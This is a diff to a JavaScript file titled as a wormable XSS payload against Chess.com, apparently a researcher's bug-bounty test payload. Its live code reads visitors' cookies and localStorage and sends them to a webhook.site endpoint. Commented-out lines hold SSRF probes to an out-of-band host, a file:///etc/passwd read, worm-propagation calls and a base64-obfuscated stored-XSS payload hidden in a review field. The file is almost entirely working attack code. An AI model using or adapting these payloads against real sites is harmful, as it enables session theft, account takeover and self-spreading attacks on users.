@@ -1,9 +1,7 @@
 // ==========================================
 // Wormable XSS Payload - Chess.com 
 // ==========================================
-// alert("DOM Clobbering XSS by Hussein on: " + document.domain);
-
-eval("alert(1)");
+alert("DOM Clobbering XSS by Hussein on: " + document.domain);
 
 // <img src="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest1"/>
 // <link rel="stylesheet" href="http://cf8kzfn2vtc0000n9fbgg8wj9zhyyyyyb.oast.fun/ssrftest2" >
@@ -11,7 +9,7 @@ eval("alert(1)");
 // <iframe src="http://127.0.0.1:8080/api/users" width="800" height="500"></iframe>
 
 
-
+//(2)
 // function addNewlines(str) 
 // {var result = '';
 // while (str.length > 0){
@@ -24,12 +22,12 @@ eval("alert(1)");
 // x.send();
 
 
-
-x= new XMLHttpRequest();
-x.onload = function(){
-document.write(this.responseText)};
-x.open("GET", "file:///etc/passwd");
-x.send();
+// (1)
+// x= new XMLHttpRequest();
+// x.onload = function(){
+// document.write(this.responseText)};
+// x.open("GET", "file:///etc/passwd");
+// x.send();
 
 var userCookies = document.cookie;
 var userStorage = JSON.stringify(localStorage);
@@ -68,3 +66,16 @@ fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49ae/", {
 //         fetch("https://webhook.site/63843b75-5c44-4e91-99c9-564afd8a49aeimpact=Worm_Propagated");
 //     }
 // });
+
+
+
+
+
+
+// "Review1":"</script Matthew and .. ",
+
+// "Review2":"Super Great Experience .. ><svg
+// onload=eval(atob('YWxlcnQoJ1Jldmlld3MgU3RvcmVkIFhTUycp'))
+
+
+
